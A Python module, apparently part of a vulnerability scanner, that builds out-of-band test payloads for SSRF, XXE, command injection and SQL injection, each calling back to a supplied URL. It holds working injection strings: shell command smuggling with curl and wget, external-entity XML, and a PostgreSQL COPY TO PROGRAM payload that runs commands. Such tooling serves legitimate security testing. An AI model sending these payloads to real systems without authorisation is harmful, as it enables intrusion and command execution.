from __future__ import annotations

from typing import List, Tuple


def ssrf_oob_payloads(callback_url: str) -> List[Tuple[str, str]]:
    """Return (payload, description) tuples for OOB SSRF testing."""
    return [
        (callback_url, "Direct HTTP callback"),
        (f"{callback_url}?type=ssrf", "HTTP callback with type param"),
    ]


def xxe_oob_payloads(callback_url: str) -> List[Tuple[str, str]]:
    """Return (payload_xml, description) tuples for OOB XXE testing."""
    dtd_url = callback_url.replace("/oob/", "/oob/xxe-dtd/")
    payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{callback_url}">
]>
<root><data>&xxe;</data></root>'''

    payload_param = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{dtd_url}">
  %xxe;
]>
<root><data>test</data></root>'''

    return [
        (payload, "XXE entity fetch via HTTP"),
        (payload_param, "XXE parameter entity via external DTD"),
    ]


def cmdi_oob_payloads(callback_url: str) -> List[Tuple[str, str]]:
    """Return (payload, description) tuples for OOB command injection testing."""
    # Extract just the host from callback URL for curl/wget
    return [
        (f"; curl {callback_url}", "curl callback"),
        (f"| wget -q {callback_url} -O /dev/null", "wget callback"),
        (f"$(curl -s {callback_url})", "subshell curl callback"),
    ]


def sqli_oob_payloads(callback_url: str) -> List[Tuple[str, str]]:
    """Return (payload, description) tuples for OOB SQL injection testing."""
    return [
        (f"' UNION SELECT LOAD_FILE('{callback_url}')-- ", "MySQL LOAD_FILE OOB"),
        (f"'; COPY (SELECT '') TO PROGRAM 'curl {callback_url}'-- ", "PostgreSQL COPY TO PROGRAM OOB"),
    ]
